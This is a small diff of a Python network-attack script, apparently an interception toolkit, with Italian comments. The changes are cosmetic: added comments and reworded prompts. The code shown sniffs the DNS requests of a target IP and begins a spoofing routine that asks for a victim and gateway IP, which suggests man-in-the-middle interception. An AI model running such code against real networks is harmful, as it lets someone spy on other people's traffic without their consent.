@@ -568,6 +568,7 @@ def net_scan():
     ask_next_action(net_scan, network, "Network")   
 
 
+
 def get_main_domain(domain):
     parts = domain.split(".")
     if len(parts) >= 2:
@@ -605,17 +606,17 @@ def dns_sniffer(iface, target_ip=""):
             if not target_ip or packet[IP].src == target_ip:
                 try:
                     domain = packet[DNSQR].qname.decode('utf-8').strip('.')
-                    main_domain = get_main_domain(domain)  
-                    print(f"{Fore.GREEN}[+] {packet[IP].src} requested: {main_domain}{Style.RESET_ALL}") 
+                    main_domain = get_main_domain(domain)  # Ottieni il dominio principale
+                    print(f"{Fore.GREEN}[+] {packet[IP].src} requested: {main_domain}{Style.RESET_ALL}")  # Mostra solo il dominio principale
                 except Exception as e:
                     print(f"{Fore.RED}[-] Error decoding DNS request: {e}{Style.RESET_ALL}")
     sniff(filter=f"udp port 53 and src {target_ip}", iface=iface, prn=process_packet, store=False)
 
 def web_spoof():
     try:
-        iface = input(f"{Fore.YELLOW}Interface (e.g., wlan0): {Style.RESET_ALL}")
-        victim_ip = input(f"{Fore.YELLOW}Victim IP > {Style.RESET_ALL}")
-        gateway_ip = input(f"{Fore.YELLOW}Gateway IP > {Style.RESET_ALL}")
+        iface = input(f"\n{Fore.YELLOW} Interface (e.g., wlan0): {Style.RESET_ALL}")
+        victim_ip = input(f"{Fore.YELLOW} Victim IP > {Style.RESET_ALL}")
+        gateway_ip = input(f"{Fore.YELLOW} Gateway IP > {Style.RESET_ALL}")
 
         enable_promiscuous(iface)
 
